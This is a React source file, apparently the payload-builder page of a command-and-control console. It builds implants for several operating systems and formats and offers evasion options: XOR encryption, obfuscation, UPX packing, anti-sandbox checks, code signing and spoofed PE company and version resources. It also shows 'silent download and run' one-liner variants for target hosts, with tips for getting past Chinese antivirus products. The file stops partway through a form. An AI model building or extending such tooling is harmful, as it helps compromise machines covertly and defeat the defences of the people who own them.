import { useState, useEffect, useCallback } from 'react'
import { Plus, Download, RefreshCw, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal, AlertTriangle, Search } from 'lucide-react'
import { builderApi, sessionApi, BuildRequest, BuilderInfo, type RelayNode, type OneLinerSet } from '../api'
import { useToast, ToastContainer } from '../components/Toast'
import { DownloadProgress } from '../components/DownloadProgress'
import { Badge, Callout, Section, RiskBadge } from '../components/ui'
import axios from 'axios'
import './Builds.css'

interface StoredImplant {
  id: string
  name: string
  format: string
  os: string
  arch: string
  protocol: string
  server_url: string
  size: number
  sha256: string
  filename: string
  created_at: number
}

/**
 * PE 资源注入（v1.4.0 S3 第二批）的请求字段清单 —— **空值处理的唯一收敛点**。
 *
 * 为什么要有这份清单：后端口径是"`resource_*` 全零值 = 不注入资源，产物与改动前逐字节
 * 一致"。前端输入框天然会产生 `''`（用户没填），把 `''` 发过去虽然目前也等价于零值，
 * 但"我没配置"这件事不该交给后端猜；而且 `resource_preset` 明确要求"空串也别发"。
 * 所以只列一次字段名，`withoutEmptyResourceFields()` 按它统一剔除。
 *
 * 类型上它是 `keyof BuildRequest` 的字面量联合：写错字段名会直接编译失败，
 * 后端新增/改名字段时这里也会跟着报错（比"静默发一个后端不认识的键"好）。
 */
const RESOURCE_REQUEST_FIELDS = [
  'resource_preset',
  'resource_icon_path',
  'resource_company_name',
  'resource_product_name',
  'resource_file_description',
  'resource_file_version',
  'resource_product_version',
  'resource_legal_copyright',
  'resource_original_filename',
  'resource_internal_name',
  'resource_timestamp_mode',
  'resource_timestamp',
] as const

/**
 * 「空值不发送」：把没填 / 只填了空白的 PE 资源字段从请求体里删掉（外加 `resource_timestamp`
 * 只在 `fixed` 策略下才有意义）。
 *
 * 非资源字段一律不动 —— 它们本来就有"0 / 空 = 跟随服务端配置"的既有语义。
 */
function withoutEmptyResourceFields(req: BuildRequest): BuildRequest {
  const out: BuildRequest = { ...req }
  // 时间戳取值只在 fixed 策略下有意义：用户填了值又把策略切回"不改"时，别把它捎带发出去。
  if ((out.resource_timestamp_mode || '').trim() !== 'fixed') delete out.resource_timestamp
  for (const field of RESOURCE_REQUEST_FIELDS) {
    const raw = out[field]
    if (typeof raw !== 'string' || raw.trim() === '') {
      delete out[field]
    } else if (raw !== raw.trim()) {
      out[field] = raw.trim() // 首尾空白（多是粘贴带进来的）不算内容
    }
  }
  return out
}

export function Builds() {
  const [activeTab, setActiveTab] = useState<'builder' | 'list'>('builder')
  const [builderInfo, setBuilderInfo] = useState<BuilderInfo | null>(null)
  // 服务端「设置 → 植入端默认参数」的当前生效值（服务端算好直接给）。
  // 下面这些输入框**一律留空 = 跟随服务端**：以前这里是写死的 60 / 10，
  // 结果"设置里配了默认值、构建页却还预填一套自己的"，两边打架。
  const implantDefaults = builderInfo?.implant_defaults
  const defaultInterval = implantDefaults?.interval ?? builderInfo?.options?.interval?.default ?? 60
  const defaultJitter = implantDefaults?.jitter ?? builderInfo?.options?.jitter?.default ?? 20
  const defaultRetryCount = implantDefaults?.retry_count ?? builderInfo?.options?.retry_count?.default ?? 3
  const defaultRetryWait = implantDefaults?.retry_wait ?? builderInfo?.options?.retry_wait?.default ?? 5
  const defaultStartupMin = implantDefaults?.startup_delay_min ?? 0
  const defaultStartupMax = implantDefaults?.startup_delay_max ?? 0
  const [loading, setLoading] = useState(false)
  const [showModal, setShowModal] = useState(false)
  const [building, setBuilding] = useState(false)
  // 构建结果：一键上线命令由服务端生成（含下载地址解析 + 多条免杀变体），
  // 前端不再用 window.location.origin 自己拼地址（从 localhost 打开后台时会生成
  // 目标机无法访问的 localhost 地址）。
  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet; signed?: boolean; signer?: string; signStatus?: string; signMessage?: string; adviceTitle?: string; adviceTips?: string[] } | null>(null)

  // format -> 下载文件扩展名；未知格式原样返回，避免误转
  const formatToExt = (format: string): string => {
    const map: Record<string, string> = {
      exe: 'exe',
      dll: 'dll',
      so: 'so',
      raw: 'raw',
      bin: 'bin',
      txt: 'txt',
      shellcode: 'txt',
      shellcode_bin: 'bin',
    }
    return map[format] ?? format
  }
  const toast = useToast()

  // ---- 载荷列表 state ----
  const [implants, setImplants] = useState<StoredImplant[]>([])
  const [implantsLoading, setImplantsLoading] = useState(false)
  const [copiedSha256, setCopiedSha256] = useState<string | null>(null)
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)
  // 一条命令上线弹窗：点击列表按钮弹出命令展示，避免 http 下剪贴板不可用导致"点不开"
  const [showOneLinerImp, setShowOneLinerImp] = useState<StoredImplant | null>(null)
  // 下载进度：按载荷 id 标记当前下载，加载中显示实时进度条
  const [dlProgress, setDlProgress] = useState<{ id: string; percent: number; loaded: number; total: number; done?: boolean } | null>(null)

  // 一条命令上线：命令与下载地址全部由服务端生成（见 internal/server/api/oneliner.go），
  // 这里只判断该载荷是否支持、并展示服务端返回的多个免杀变体。
  // 仅可直接运行的载荷支持：Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库）。
  const supportsOneLiner = (imp: StoredImplant): boolean => {
    const osName = (imp.os || 'windows').toLowerCase()
    if (osName === 'linux') return imp.format === 'exe' || imp.format === 'raw' || imp.format === 'bin'
    if (osName === 'windows') return imp.format === 'exe' || imp.format === 'raw'
    return false
  }

  // 列表弹窗内的一键上线命令：打开弹窗时按载荷 ID 向服务端索取（服务端会重新
  // 解析目标机可达地址，避免地址过期或写成回环地址）。
  const [oneLinerSet, setOneLinerSet] = useState<OneLinerSet | null>(null)
  const [oneLinerLoading, setOneLinerLoading] = useState(false)

  useEffect(() => {
    if (!showOneLinerImp) {
      setOneLinerSet(null)
      return
    }
    let cancelled = false
    setOneLinerLoading(true)
    setOneLinerSet(null)
    api
      .get<OneLinerSet>(`/implants/stored/${showOneLinerImp.id}/oneliner`)
      .then((res) => {
        if (!cancelled) setOneLinerSet(res.data)
      })
      .catch((err) => {
        console.error('Failed to load one-liner:', err)
        if (!cancelled) setOneLinerSet({ host: '', base_url: '', variants: [], error: '命令生成失败，请重试' })
      })
      .finally(() => {
        if (!cancelled) setOneLinerLoading(false)
      })
    return () => {
      cancelled = true
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [showOneLinerImp])

  const oneLinerOs = showOneLinerImp
    ? (showOneLinerImp.os || 'windows').toLowerCase()
    : 'windows'
  const oneLinerOsLabel = oneLinerOs === 'linux' ? 'Linux' : 'Windows'

  // 复制文本到剪贴板：优先使用 Clipboard API，HTTP 非 localhost 环境
  // 不可用时降级为 execCommand，避免点击按钮无任何反应
  const copyToClipboard = (text: string): boolean => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text)
        return true
      }
    } catch {
      // fallthrough 到降级方案
    }
    try {
      const ta = document.createElement('textarea')
      ta.value = text
      ta.style.position = 'fixed'
      ta.style.opacity = '0'
      document.body.appendChild(ta)
      ta.select()
      const ok = document.execCommand('copy')
      ta.remove()
      return ok
    } catch {
      return false
    }
  }

  const copyCommand = (cmd: string) => {
    if (copyToClipboard(cmd)) {
      setCopiedCmd(cmd)
      setTimeout(() => setCopiedCmd(null), 1500)
      toast.success('命令已复制')
    } else {
      toast.error('复制失败，请手动选中命令复制')
    }
  }

  const api = axios.create({
    baseURL: '/api/v1',
    headers: { 'Content-Type': 'application/json' },
  })
  api.interceptors.request.use((config) => {
    const token = localStorage.getItem('toshell-token')
    if (token) config.headers.Authorization = `Bearer ${token}`
    return config
  })

  const fetchImplants = useCallback(async () => {
    setImplantsLoading(true)
    try {
      const res = await api.get<{ implants: StoredImplant[] }>('/implants/stored')
      setImplants(res.data.implants || [])
    } catch (err) {
      console.error('Failed to fetch implants:', err)
    } finally {
      setImplantsLoading(false)
    }
  }, [])

  const handleImplantDownload = async (imp: StoredImplant) => {
    const id = imp.id
    setDlProgress({ id, percent: 0, loaded: 0, total: 0 })
    try {
      const res = await api.get(`/implants/stored/${id}`, {
        responseType: 'blob',
        onDownloadProgress: (e) => {
          setDlProgress(prev => ({
            id,
            percent: e.total ? Math.min(100, Math.round((e.loaded / e.total) * 100)) : (prev?.percent ?? 0),
            loaded: e.loaded,
            total: e.total || 0,
          }))
        },
      })
      const url = window.URL.createObjectURL(new Blob([res.data]))
      const link = document.createElement('a')
      link.href = url
      // 使用友好的 name.ext 作为下载文件名，磁盘上的唯一 ID 文件名不对用户暴露
      const ext = formatToExt(imp.format)
      const dlName = ext ? `${imp.name}.${ext}` : imp.name
      link.download = dlName
      document.body.appendChild(link)
      link.click()
      link.remove()
      window.URL.revokeObjectURL(url)
      // 下载完成后短暂显示"下载完成"再收起
      setDlProgress({ id, percent: 100, loaded: res.data.size, total: res.data.size, done: true })
      setTimeout(() => setDlProgress(prev => (prev?.id === id ? null : prev)), 900)
      toast.success(`下载成功: ${dlName}`)
    } catch {
      setDlProgress(prev => (prev?.id === id ? null : prev))
      toast.error('下载失败')
    }
  }

  const handleImplantDelete = async (imp: StoredImplant) => {
    try {
      await api.delete(`/implants/${imp.id}`)
      setImplants(prev => prev.filter(i => i.id !== imp.id))
      toast.success(`已删除: ${imp.name}`)
    } catch {
      toast.error('删除失败')
    }
  }

  const copySHA256 = (sha256: string) => {
    if (copyToClipboard(sha256)) {
      setCopiedSha256(sha256)
      setTimeout(() => setCopiedSha256(null), 1500)
    }
  }

  const formatTime = (ts: number) => new Date(ts * 1000).toLocaleString('zh-CN')
  const formatSize = (bytes: number) => {
    if (bytes < 1024) return `${bytes} B`
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`
    return `${(bytes / (1024 * 1024)).toFixed(2)} MB`
  }
  const OS_ICON: Record<string, React.ReactNode> = {
    windows: <Monitor size={14} />,
    linux: <Server size={14} />,
    darwin: <Cpu size={14} />,
  }

  const [relayNodes, setRelayNodes] = useState<RelayNode[]>([])

  const fetchRelayNodes = useCallback(async () => {
    try {
      const res = await sessionApi.listRelayNodes()
      setRelayNodes(res.data.relay_nodes || [])
    } catch {
      setRelayNodes([])
    }
  }, [])

  const [formData, setFormData] = useState<BuildRequest>({
    name: '',
    format: 'exe',
    language: 'go',
    listener_id: '',
    server_url: '',
    protocol: 'tcp',
    // 回连节奏：**0 = 跟随服务端配置**（设置 → 植入端默认参数）。
    // 不在这里预填具体数值，否则会覆盖用户在设置页配的默认值。
    interval: 0,
    jitter: 0,
    retry_count: 0,
    retry_wait: 0,
    kill_date: '',
    working_hours: '',
    relay_listen: '',
    front_domain: '',
    profile: 'full',
    output_path: '',
    os: 'windows',
    arch: 'amd64',
    // Evasion defaults
    xor_encrypt: false,
    xor_key_size: 16,
    garble_enabled: false,
    upx_enabled: false,
    // 主动反沙箱进程检测：默认关闭（会被国产杀软主动防御拦截，见服务端说明）
    evasion_scan: false,
    // BOF 支持：默认关闭（会带上整套 Cobalt Strike Beacon API 名字，是 full 档案里唯一剩下的高信号明文）
    bof_enabled: false,
    // 代码签名：证书在服务端配置，这里只决定本次构不签
    sign_enabled: false,
    // DLL 载荷：导出名（rundll32 用）与"加载即启动"（白加黑用）
    dll_export: '',
    dll_autostart: true,
    // 启动随机延迟：默认沿用服务端配置（implant.startup_delay_min/max）
    startup_delay_min: 0,
    startup_delay_max: 0,
    // PE 版本资源 / 图标 / 公司信息 / 时间戳（v1.4.0 S3 第二批）：
    // **全部留空 = 不注入资源**（产物与以前逐字节一致）。留空值在提交前会被
    // withoutEmptyResourceFields() 从请求体里剔除，见该函数注释。
    // 图标路径留空时后端会兜底用设置里的 implant.icon_path。
    resource_preset: '',
    resource_icon_path: '',
    resource_company_name: '',
    resource_product_name: '',
    resource_file_description: '',
    resource_file_version: '',
    resource_product_version: '',
    resource_legal_copyright: '',
    resource_original_filename: '',
    resource_internal_name: '',
    resource_timestamp_mode: '',
    resource_timestamp: '',
  })

  /* ── PE 资源注入：能力对象来自 GET /builders 的 evasion（v1.4.0 S3 第二批）──
     老版本服务端没有这一组字段：`resource_presets` 缺失或为空数组时**不渲染预设下拉**
     （只留"不使用预设"这条语义，即什么都不选），手填字段照旧可用 —— 不能因此崩掉，
     也不能把 "neutral" 硬编码进前端（预设名是服务端契约，将来加预设要能自动出现）。 */
  const evasion = builderInfo?.evasion
  const resourcePresets: string[] = Array.isArray(evasion?.resource_presets) ? evasion.resource_presets : []
  /** 服务端声明的默认状态（"off" = 不带 resource_* 字段时产物逐字节不变） */
  const resourceDefaultOff = (evasion?.resource_default ?? 'off').toLowerCase() === 'off'
  // 格式/系统门控：资源注入只对 Windows 的 exe/bin/dll 生效，且 C 植入端（mingw 管线）
  // 未接入（服务端 shouldPatchResources 会把这三类都跳过）。不满足时**只显示一句说明、
  // 不显示控件** —— 让操作员填半天却拿到"构建成功但没资源"的哑结果是最坏的选择。
  const osFormatOkForResource = formData.os === 'windows' && ['exe', 'bin', 'dll'].includes(formData.format)
  const resourceSupported = osFormatOkForResource && (formData.language || 'go') !== 'c'
  const resourceUnsupportedReason = !osFormatOkForResource
    ? formData.os !== 'windows'
      ? `目标系统是 ${formData.os}：Linux/macOS 产物是 ELF/Mach-O，没有 .rsrc 节可写`
      : `交付格式是 ${formData.format}：shellcode / raw / so 不按 PE 交付，资源节在转换后只会变成几 KB 垃圾数据`
    : '植入端语言是 C（mingw 管线）：该链路本次未接入资源注入，服务端会跳过这组参数'

  const fetchData = async () => {
    setLoading(true)
    try {
      const builderRes = await builderApi.list()
      setBuilderInfo(builderRes.data)
    } catch (error) {
      console.error('Failed to fetch data:', error)
      setBuilderInfo({
        formats: ['exe', 'dll', 'shellcode', 'raw'],
        protocols: ['tcp', 'http', 'https'],
        os: ['windows', 'linux', 'darwin'],
        arch: ['amd64', '386', 'arm64'],
        listeners: [],
        options: {
          interval: { min: 1, max: 300, default: 60 },
          jitter: { min: 0, max: 100, default: 20 },
          retry_count: { min: 0, max: 10, default: 3 },
          retry_wait: { min: 1, max: 60, default: 5 },
        },
        implant_defaults: {
          interval: 60,
          jitter: 20,
          retry_count: 3,
          retry_wait: 5,
        },
      })
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchData()
    fetchRelayNodes()
    
    // 从localStorage读取构建结果
    const savedResult = localStorage.getItem('buildResult')
    if (savedResult) {
      try {
        const parsedResult = JSON.parse(savedResult)
        // 确保结构完整
        if (!parsedResult.serverUrl) {
          parsedResult.serverUrl = formData.server_url
        }
        setBuildResult(parsedResult)
      } catch (error) {
        console.error('Failed to parse saved build result:', error)
      }
    }
  }, [formData.server_url])

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target as HTMLInputElement
    setFormData(prev => {
      let newVal: any = value
      
      // Checkboxes
      if (type === 'checkbox') {
        newVal = (e.target as HTMLInputElement).checked
      } else if (name === 'xor_key_size') {
        newVal = parseInt(value) || 16
      } else if (name === 'interval' || name === 'jitter' || name === 'retry_count' || name === 'retry_wait'
        || name === 'startup_delay_min' || name === 'startup_delay_max') {
        newVal = parseInt(value) || 0
      }
      
      const newData = {
        ...prev,
        [name]: newVal
      }
      
      // 当目标系统改变时，自动调整输出格式
      if (name === 'os') {
        if (value === 'windows') {
          newData.format = 'exe'
        } else {
          newData.format = 'bin'
        }
      }
      
      // 语言切换：C 植入端仅支持 Windows exe，自动约束
      if (name === 'language') {
        if (value === 'c') {
          newData.os = 'windows'
          newData.arch = 'amd64'
          newData.format = 'exe'
          newData.profile = 'light' // C 植入端天然精简，profile 无意义
        } else {
          newData.profile = prev.profile === 'light' ? 'full' : prev.profile
        }
      }
      
      return newData
    })
  }

  const handleServerUrlKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && !formData.server_url) {
      e.preventDefault()
      const defaultUrl = 'ws://localhost:8080'
      setFormData(prev => ({
        ...prev,
        server_url: defaultUrl
      }))
      toast.info(`已填写默认服务器地址: ${defaultUrl}`)
    }
  }

  const handleBuild = async () => {
    if (!formData.server_url) {
      toast.warning('请输入服务器地址')
      return
    }

    setBuilding(true)
    try {
      // 资源字段留空＝不发送（后端据此走"不注入资源"分支，产物逐字节不变）。
      const response = await builderApi.create(withoutEmptyResourceFields(formData))
      const result = {
        id: response.data.id,
        name: response.data.name,
        format: response.data.format,
        size: response.data.size,
        serverUrl: formData.server_url,
        // 代码签名结果（未启用签名时服务端返回空值）
        signed: response.data.signed,
        signer: response.data.signer,
        signStatus: response.data.sign_status,
        signMessage: response.data.sign_message,
        adviceTitle: response.data.loader_advice_title,
        adviceTips: response.data.loader_advice_tips,
        // 一键上线命令与地址解析结果全部取自服务端响应
        oneLinerSet: response.data.one_liners?.length
          ? {
              host: response.data.one_liner_host || '',
              base_url: response.data.one_liner_base || '',
              warning: response.data.one_liner_warning,
              variants: response.data.one_liners,
            }
          : undefined,
      }
      setBuildResult(result)
      
      // 存储到localStorage
      localStorage.setItem('buildResult', JSON.stringify(result))
      
      setShowModal(false)
      toast.success(`载荷构建成功！名称: ${result.name}, 大小: ${(result.size / 1024).toFixed(2)} KB`)
    } catch (error) {
      console.error('Failed to build payload:', error)
      // 服务端把真实失败原因放在 error 字段（例如「未找到可用的 mingw-w64 gcc…」
      // 或「garble 与当前 Go 版本不兼容…」），原样透出，别让用户只看到「请检查配置」。
      const serverMsg =
        (error as { response?: { data?: { error?: string } } })?.response?.data?.error || ''
      toast.error(serverMsg || '构建失败，请检查配置')
    } finally {
      setBuilding(false)
    }
  }

  const handleDownload = async () => {
    if (!buildResult) {
      toast.warning('请先构建载荷')
      return
    }

    // 旧版本 localStorage 没有记录构建 ID，无法精确定位到文件，
    // 引导用户到「载荷列表」中下载，避免误触发重新构建。
    if (!buildResult.id) {
      toast.info('旧构建记录无法直接下载，请到「载荷列表」中选择对应载荷下载')
      return
    }

    const id = buildResult.id
    setDlProgress({ id, percent: 0, loaded: 0, total: 0 })
    try {
      // 直接用构建 ID 下载已生成的载荷文件，绝不会重新构建
      const response = await api.get(`/implants/stored/${id}`, {
        responseType: 'blob',
        onDownloadProgress: (e) => {
          setDlProgress(prev => ({
            id,
            percent: e.total ? Math.min(100, Math.round((e.loaded / e.total) * 100)) : (prev?.percent ?? 0),
            loaded: e.loaded,
            total: e.total || 0,
          }))
        },
      })
      const url = window.URL.createObjectURL(new Blob([response.data]))
      const link = document.createElement('a')
      link.href = url

      const ext = formatToExt(buildResult.format)
      link.setAttribute('download', ext ? `${buildResult.name}.${ext}` : buildResult.name)
      document.body.appendChild(link)
      link.click()
      link.remove()
      window.URL.revokeObjectURL(url)
      // 下载完成后短暂显示"下载完成"再收起
      setDlProgress({ id, percent: 100, loaded: response.data.size, total: response.data.size, done: true })
      setTimeout(() => setDlProgress(prev => (prev?.id === id ? null : prev)), 900)
      toast.success('载荷下载成功')
    } catch (error) {
      console.error('Failed to download payload:', error)
      setDlProgress(prev => (prev?.id === id ? null : prev))
      toast.error('下载失败，请到「载荷列表」中确认载荷是否存在')
    }
  }

  const handleDelete = () => {
    // 从localStorage删除构建结果
    localStorage.removeItem('buildResult')
    // 清除状态
    setBuildResult(null)
    // 显示成功提示
    toast.success('载荷已删除')
  }

  return (
    <div className="builds-page">
      <ToastContainer toasts={toast.toasts} removeToast={toast.removeToast} />
      <div className="page-header">
        <div className="header-title">
          <FileCode size={24} />
          <h1>载荷</h1>
        </div>
        <div className="header-actions">
          {activeTab === 'builder' ? (
            <>
              <button className="btn btn-secondary" onClick={fetchData}>
                <RefreshCw size={16} className={loading ? 'spinning' : ''} />
                刷新
              </button>
              <button className="btn btn-primary" onClick={() => { fetchData(); setShowModal(true); }}>
                <Plus size={16} />
                生成载荷
              </button>
            </>
          ) : (
            <>
              <button className="btn btn-secondary" onClick={fetchImplants}>
                <RefreshCw size={16} className={implantsLoading ? 'spinning' : ''} />
                刷新
              </button>
            </>
          )}
        </div>
      </div>

      {/* Tab 切换 */}
      <div className="tab-bar">
        <button
          className={`tab-btn ${activeTab === 'builder' ? 'active' : ''}`}
          onClick={() => setActiveTab('builder')}
        >
          <FileCode size={16} />
          生成载荷
        </button>
        <button
          className={`tab-btn ${activeTab === 'list' ? 'active' : ''}`}
          onClick={() => { setActiveTab('list'); fetchImplants(); }}
        >
          <HardDrive size={16} />
          载荷列表
          {implants.length > 0 && (
            <span className="tab-badge">{implants.length}</span>
          )}
        </button>
      </div>

      {activeTab === 'builder' ? (
        /* ==================== 生成载荷 ==================== */
        <div className="builds-content">
          <div className="build-info-cards">
            <div className="info-card">
              <div className="info-icon"><FileCode size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持格式</span>
                <span className="info-value">{builderInfo?.formats?.join(', ') || 'exe, dll, shellcode, raw'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Cpu size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持协议</span>
                <span className="info-value">{builderInfo?.protocols?.join(', ') || 'tcp, http, https'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Server size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持系统</span>
                <span className="info-value">{builderInfo?.os?.join(', ') || 'windows, linux, darwin'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Cpu size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持架构</span>
                <span className="info-value">{builderInfo?.arch?.join(', ') || 'amd64, 386, arm64'}</span>
              </div>
            </div>
          </div>

          {buildResult && (
            <div className="build-result-card">
              <h3>上次构建</h3>
              <div className="result-info">
                <div className="result-item"><span className="result-label">名称</span><span className="result-value">{buildResult.name}</span></div>
                <div className="result-item">
                  <span className="result-label">载荷 ID</span>
                  <span className="result-value" style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
                    <code style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{buildResult.id}</code>
                    <button
                      onClick={() => copyToClipboard(buildResult.id)}
                      title="复制载荷 ID（加载器链里的 <DLL载荷ID> / <shellcode载荷ID> 就是填它）"
                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--text-dim)', padding: 0, display: 'flex' }}
                    >
                      <Copy size={13} />
                    </button>
                  </span>
                </div>
                <div className="result-item"><span className="result-label">格式</span><span className="result-value">{buildResult.format}</span></div>
                <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
                <div className="result-item">
                  <span className="result-label">代码签名</span>
                  <span className="result-value">
                    {buildResult.signed ? (
                      <Badge tone="ok">
                        <CheckCircle2 size={12} /> 已签名
                      </Badge>
                    ) : (
                      <Badge tone="warn">未签名</Badge>
                    )}
                  </span>
                </div>
              </div>

              {/* 签名详情 / 未签名原因：用 Callout 直接说清"能不能在装 360 的机器上跑" */}
              {buildResult.signMessage !== undefined && (
                <Callout tone={buildResult.signed ? 'ok' : 'warn'} title={buildResult.signed ? `签名者：${buildResult.signer || '未知'}` : '这个载荷未签名'} style={{ marginBottom: 12 }}>
                  {buildResult.signMessage}
                  {!buildResult.signed && (
                    <div style={{ marginTop: 4 }}>
                      在装有 360/电脑管家的主机上，未签名的新 PE 会在创建进程阶段被拒绝执行并删除
                      —— 要么在服务端配好证书（设置 → 植入端与载荷构建）后重新构建，要么改用下面的加载器链。
                    </div>
                  )}
                </Callout>
              )}

              {/* 落地链建议：按"是否已签名 + 平台/格式"给出降级顺序 */}
              {buildResult.adviceTitle && (
                <Callout tone="info" title={`落地建议：${buildResult.adviceTitle}`} style={{ marginBottom: 12 }}>
                  <ol style={{ margin: '4px 0 0 18px', padding: 0, lineHeight: 1.8 }}>
                    {(buildResult.adviceTips || []).map((t, i) => (
                      <li key={i}>{t}</li>
                    ))}
                  </ol>
                </Callout>
              )}

              {buildResult.oneLinerSet?.variants?.length ? (
                <div className="oneliner-section">
                  <div className="oneliner-section-title">
                    <Terminal size={14} /> 一条命令上线
                    <span className="oneliner-tag">{buildResult.oneLinerSet.variants.length} 种方式</span>
                  </div>
                  <OneLinerList
                    set={buildResult.oneLinerSet}
                    copiedCmd={copiedCmd}
                    onCopy={copyCommand}
                    buildId={buildResult.id}
                    format={buildResult.format}
                  />
                  <p className="oneliner-hint">
                    在目标主机上执行任一命令即可静默下载并运行该载荷；下载地址由服务端按目标机可达性解析（不是控制台的访问地址）。
                  </p>
                </div>
              ) : null}
              <div className="build-result-actions">
                <button className="btn btn-primary" onClick={handleDownload}><Download size={16} />下载载荷</button>
                <button className="btn btn-danger" onClick={handleDelete}><Trash2 size={16} />删除载荷</button>
              </div>
              {dlProgress?.id === buildResult.id && (
                <DownloadProgress percent={dlProgress.percent} loaded={dlProgress.loaded} total={dlProgress.total} done={dlProgress.done} />
              )}
            </div>
          )}
        </div>
      ) : (
        /* ==================== 载荷列表 ==================== */
        <div className="builds-content">
          {implants.length === 0 && !implantsLoading ? (
            <div style={{ textAlign: 'center', padding: '60px 20px', color: 'var(--color-text-muted)' }}>
              <FileCode size={48} style={{ marginBottom: 16, opacity: 0.4 }} />
              <p style={{ fontSize: 16, marginBottom: 8 }}>暂无载荷记录</p>
              <p style={{ fontSize: 13 }}>
                点击上方<span style={{ color: 'var(--color-primary)', cursor: 'pointer' }} onClick={() => setActiveTab('builder')}>「生成载荷」</span>创建新载荷
              </p>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              {implants.map((imp) => (
                <div key={imp.id} className="build-result-card" style={{ padding: '20px 24px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 12 }}>
                        <h3 style={{ margin: 0 }}>{imp.name}</h3>
                        <span style={{ padding: '2px 10px', borderRadius: 4, fontSize: 11, fontWeight: 600, background: 'var(--color-bg)', border: '1px solid var(--color-border)', color: 'var(--color-text-secondary)', textTransform: 'uppercase' }}>{imp.format}</span>
                        <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4, padding: '2px 8px', borderRadius: 4, fontSize: 11, background: 'var(--color-bg)', border: '1px solid var(--color-border)', color: 'var(--color-text-secondary)' }}>
                          {OS_ICON[imp.os] || <Cpu size={14} />}
                          {(imp.os || 'unknown')}/{imp.arch || '-'}
                        </span>
                      </div>
                      <div className="result-info" style={{ marginBottom: 0 }}>
                        <div className="result-item"><span className="result-label">大小</span><span className="result-value">{formatSize(imp.size)}</span></div>
                        <div className="result-item"><span className="result-label">协议</span><span className="result-value">{(imp.protocol || 'HTTP').toUpperCase()}</span></div>
                        <div className="result-item server-url"><span className="result-label">服务器</span><span className="result-value">{imp.server_url}</span></div>
                        <div className="result-item"><span className="result-label">创建时间</span><span className="result-value">{formatTime(imp.created_at)}</span></div>
                      </div>
                      {imp.sha256 && (
                        <div style={{ marginTop: 10, display: 'flex', alignItems: 'center', gap: 8, fontSize: 12, fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>
                          <Shield size={12} />
                          <span style={{ opacity: 0.7 }}>SHA256:</span>
                          <code style={{ padding: '1px 6px', borderRadius: 3, background: 'var(--color-bg)', fontSize: 11 }}>{imp.sha256.substring(0, 16)}...</code>
                          <button onClick={() => copySHA256(imp.sha256)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: copiedSha256 === imp.sha256 ? 'var(--color-success)' : 'var(--color-text-muted)', padding: 0, display: 'flex' }} title="复制 SHA256">
                            {copiedSha256 === imp.sha256 ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="build-result-actions" style={{ marginTop: 12 }}>
                    <button className="btn btn-primary" onClick={() => handleImplantDownload(imp)}><Download size={16} />下载</button>
                    {supportsOneLiner(imp) && (
                      <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(imp)} title="查看一条命令上线命令">
                        <Terminal size={16} />
                        一条命令上线
                      </button>
                    )}
                    <button className="btn btn-danger" onClick={() => handleImplantDelete(imp)}><Trash2 size={16} />删除</button>
                  </div>
                  {dlProgress?.id === imp.id && (
                    <DownloadProgress percent={dlProgress.percent} loaded={dlProgress.loaded} total={dlProgress.total} done={dlProgress.done} />
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 一条命令上线弹窗 */}
      {showOneLinerImp && (
        <div className="modal-overlay" onClick={() => setShowOneLinerImp(null)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h2>一条命令上线</h2>
              <button className="close-btn" onClick={() => setShowOneLinerImp(null)}>×</button>
            </div>
            <div className="modal-body">
              <p style={{ marginBottom: 12, fontSize: 13, lineHeight: 1.6, color: 'var(--color-text-secondary)' }}>
                在目标 {oneLinerOsLabel} 主机上执行以下任一命令，将静默下载并运行「{showOneLinerImp.name}」
                （对应 {(showOneLinerImp.protocol || 'HTTP').toUpperCase()} 监听器）：
              </p>
              <OneLinerList
                set={oneLinerSet}
                loading={oneLinerLoading}
                copiedCmd={copiedCmd}
                onCopy={copyCommand}
              />
              <p className="oneliner-hint">复制按钮在 http 访问下可能不可用，可直接选中命令文本手动复制。</p>
            </div>
            <div className="modal-footer">
              <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(null)}>关闭</button>
            </div>
          </div>
        </div>
      )}

      {/* 生成载荷弹窗 */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h2>生成载荷</h2>
              <button className="close-btn" onClick={() => setShowModal(false)}>×</button>
            </div>
            <div className="modal-body">
              <div className="form-group">
                <label>载荷名称</label>
                <input
